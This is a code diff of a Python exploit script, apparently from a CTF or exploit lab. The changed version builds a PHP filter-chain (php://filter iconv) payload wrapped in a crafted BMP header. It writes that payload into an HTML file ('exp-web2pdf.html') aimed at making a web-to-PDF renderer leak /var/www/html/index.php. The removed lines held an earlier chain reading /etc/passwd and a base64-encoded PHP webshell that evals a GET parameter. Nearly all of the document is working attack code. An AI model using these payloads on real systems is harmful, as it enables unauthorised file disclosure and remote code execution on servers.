@@ -1,0 +1,37 @@
+diff --git a/test.py b/test.py
+index 7c616cd..c4cfffa 100644
+--- a/test.py
++++ b/test.py
+@@ -1,7 +1,15 @@
+-file_to_use = "/etc/passwd"
++import base64, sys
+ 
+-#<?php eval($_GET[1]);?>a
+-base64_payload = "PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h"
++file_to_use = "/var/www/html/index.php"
++
++width, height = 15000, 1
++
++payload = b'BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00' + \
++    width.to_bytes(4, 'little') + \
++    height.to_bytes(4, 'little') + \
++    b'\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
++
++base64_payload = base64.b64encode(payload).decode()
+ 
+ # generate some garbage base64
+ filters = "convert.iconv.UTF8.CSISO2022KR|"
+@@ -20,8 +28,10 @@ for c in base64_payload[::-1]:
+ 
+ filters += "convert.base64-decode"
+ 
++filters = "convert.iconv.UTF8.UTF16LE|" * 3 + filters
++
+ final_payload = f"php://filter/{filters}/resource={file_to_use}"
+ 
+-with open('test.php','w') as f:
+-    f.write('<?php echo file_get_contents("'+final_payload+'");?>')
+-print(final_payload)
++with open('exp-web2pdf.html', 'w') as f:
++    f.write(f'<h1>exploit</h1><img src="././{final_payload}" ORIG_SRC="x">')
++    
